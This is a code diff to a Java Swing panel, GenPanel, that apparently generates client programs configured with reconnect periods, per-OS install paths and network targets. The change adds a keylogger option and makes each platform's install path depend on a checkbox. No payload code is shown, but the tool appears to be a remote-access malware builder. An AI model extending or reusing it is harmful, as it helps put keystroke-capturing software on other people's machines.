@@ -719,6 +719,7 @@ public class GenPanel extends JPanel {
 		ic.setOutputType((String) type_comboBox.getSelectedItem());
 		ic.setDelay((int) fld_delay.getValue());
 		ic.setReconnectPeriod((int) ntab.fld_connect_period.getValue());
+		ic.setKeylogger(ftab.chckbxKeylogger.isSelected());
 
 		ic.setImsg(fld_install_message.getText());
 
@@ -738,34 +739,44 @@ public class GenPanel extends JPanel {
 		}
 		}
 
-		if (fld_install_windows.getSelectedItem() == null) {
-			ic.setPathWin(ipath_win[0]);
-		} else {
-			ic.setPathWin((String) fld_install_windows.getSelectedItem());
+		if (ftab.chckbxWindows.isSelected()) {
+			if (fld_install_windows.getSelectedItem() == null) {
+				ic.setPathWin(ipath_win[0]);
+			} else {
+				ic.setPathWin((String) fld_install_windows.getSelectedItem());
+			}
 		}
 
-		if (fld_install_linux.getSelectedItem() == null) {
-			ic.setPathLin(ipath_lin[0]);
-		} else {
-			ic.setPathLin((String) fld_install_linux.getSelectedItem());
+		if (ftab.chckbxLinux.isSelected()) {
+			if (fld_install_linux.getSelectedItem() == null) {
+				ic.setPathLin(ipath_lin[0]);
+			} else {
+				ic.setPathLin((String) fld_install_linux.getSelectedItem());
+			}
 		}
 
-		if (fld_install_osx.getSelectedItem() == null) {
-			ic.setPathOsx(ipath_osx[0]);
-		} else {
-			ic.setPathOsx((String) fld_install_osx.getSelectedItem());
+		if (ftab.chckbxOsX.isSelected()) {
+			if (fld_install_osx.getSelectedItem() == null) {
+				ic.setPathOsx(ipath_osx[0]);
+			} else {
+				ic.setPathOsx((String) fld_install_osx.getSelectedItem());
+			}
 		}
 
-		if (fld_install_solaris.getSelectedItem() == null) {
-			ic.setPathSol(ipath_sol[0]);
-		} else {
-			ic.setPathSol((String) fld_install_solaris.getSelectedItem());
+		if (ftab.chckbxSolaris.isSelected()) {
+			if (fld_install_solaris.getSelectedItem() == null) {
+				ic.setPathSol(ipath_sol[0]);
+			} else {
+				ic.setPathSol((String) fld_install_solaris.getSelectedItem());
+			}
 		}
 
-		if (fld_install_bsd.getSelectedItem() == null) {
-			ic.setPathBsd(ipath_bsd[0]);
-		} else {
-			ic.setPathBsd((String) fld_install_bsd.getSelectedItem());
+		if (ftab.chckbxBsd.isSelected()) {
+			if (fld_install_bsd.getSelectedItem() == null) {
+				ic.setPathBsd(ipath_bsd[0]);
+			} else {
+				ic.setPathBsd((String) fld_install_bsd.getSelectedItem());
+			}
 		}
 
 		for (NetworkTarget nt : ntab.table.getTargets()) {
